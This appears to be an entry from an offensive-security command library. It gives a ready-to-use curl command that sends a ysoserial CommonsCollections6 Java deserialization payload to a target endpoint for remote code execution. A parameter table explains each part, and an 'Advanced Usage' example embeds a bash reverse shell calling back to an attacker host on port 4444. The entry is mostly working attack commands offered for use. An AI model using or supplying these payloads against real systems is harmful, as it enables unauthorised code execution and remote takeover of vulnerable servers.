---
data: >-
  curl -X POST -H "Content-Type: application/x-www-form-urlencoded" -d
  "input=$(java -jar ysoserial.jar CommonsCollections6 'command' | base64 -w0)"
  https://target.com/endpoint
tags:
  - web
  - exploit
  - rce
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:32.193Z'
id: 22b09ee0-622f-4a11-8bde-37fb1cf3cbf2
verified: false
validated: true
submitted: true
---
# curl-send-deserialization-payload

## Command

```bash
curl -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "input=$(java -jar ysoserial.jar CommonsCollections6 'command' | base64 -w0)" https://target.com/endpoint
```

## Description

This command uses curl to send a POST request with a base64-encoded serialized payload to a target endpoint, exploiting deserialization vulnerabilities to achieve RCE. It assumes a Java application vulnerable to gadget chains like CommonsCollections.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies POST method | Yes |
| `-H "Content-Type: ..."` | Sets request header for form data | Yes |
| `-d "input=..."` | Payload data; replace 'command' with actual code to execute | Yes |
| `https://target.com/endpoint` | Target URL | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://target.com/endpoint?data=$(echo 'test' | base64)"
```

### Advanced Usage

```bash
curl -X POST -d "input=$(java -jar ysoserial.jar CommonsCollections6 '/bin/bash -i >& /dev/tcp/attacker-ip/4444 0>&1' | base64 -w0)" https://target.com/endpoint
```

## Expected Output

Server response indicating successful deserialization, such as HTTP 200 with altered content, error messages revealing execution, or a reverse shell connection if using a shell payload.

## Related

- [[Related Procedure|procedures/Exploit-Deserialization-for-RCE-via-POST-GET]]
